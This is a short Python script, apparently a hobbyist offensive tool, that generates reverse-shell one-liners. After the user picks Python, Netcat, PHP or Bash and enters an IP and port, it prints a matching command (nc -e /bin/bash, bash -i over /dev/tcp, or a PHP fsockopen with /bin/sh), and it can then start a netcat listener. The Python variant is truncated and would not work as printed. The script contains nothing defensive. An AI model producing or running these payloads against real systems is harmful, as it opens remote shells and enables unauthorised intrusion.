import os


os.system("clear")

print("""
██████  ███████ ██    ██ ███████ ██████  ███████ ███████ 
██   ██ ██      ██    ██ ██      ██   ██ ██      ██      
██████  █████   ██    ██ █████   ██████  ███████ █████   
██   ██ ██       ██  ██  ██      ██   ██      ██ ██      
██   ██ ███████   ████   ███████ ██   ██ ███████ ███████ 

\033[0;35;1m███████╗ ██████╗ ██████╗  █████╗ \003 
██╔════╝██╔═══██╗██╔══██╗██╔══██╗
█████╗  ██║   ██║██║  ██║███████║
██╔══╝  ██║   ██║██║  ██║██╔══██║         
██║     ╚██████╔╝██████╔╝██║  ██║                 		
╚═╝      ╚═════╝ ╚═════╝ ╚═╝  ╚═╝                 
                                 by: @gt9sec 		""")

print("""
[ 1 ] Python
[ 2 ] Netcat
[ 3 ] PHP 
[ 4 ] Bash """)
foda = int(input('>>> '))
if foda == 1:
	ip_foda = input("IP: ")
	porta_foda = input("PORTA: ")
	print(""" 
Comando:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{})) """.format(ip_foda, porta_foda))
		

elif foda == 2:
	ip_fds = input("IP: ")
	porta_fds = (input("PORTA: "))
	print(""" 
Comando:
nc -e /bin/bash {} {}""".format(ip_fds, porta_fds))
	

elif foda == 3:
	ip_pika = input("IP: ")
	porta_pika = input("PORTA: ")
	print("""
Comando:
php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");' """.format(ip_pika, porta_pika))
	

elif foda == 4:
	ip_puta = input("IP: ")
	porta_puta = input("PORTA: ")
	print("""
comando:
bash -i >& /dev/tcp/{}/{} 0>&1""".format(ip_puta, porta_puta))
	
elif foda == 5:
	print("""
Instagram: @gt9sec
TikTok:    @gt9sec
Team:	   skullsec """)
	

else:
	print("opção invalida")

print("\ndeseja iniciar uma escuta?[s/n]")
fd = input(">>> ")
if fd == 's':
	print("\nEnsira a porta da escuta: ")
	fds = int(input(">>> "))
	print("\nescutando...")
	os.system("nc -nlvp {}".format(fds))
elif fd == 'n':
	from time import sleep
	sleep(1)
	print("me segue no insta e no ttk  @gt9sec")


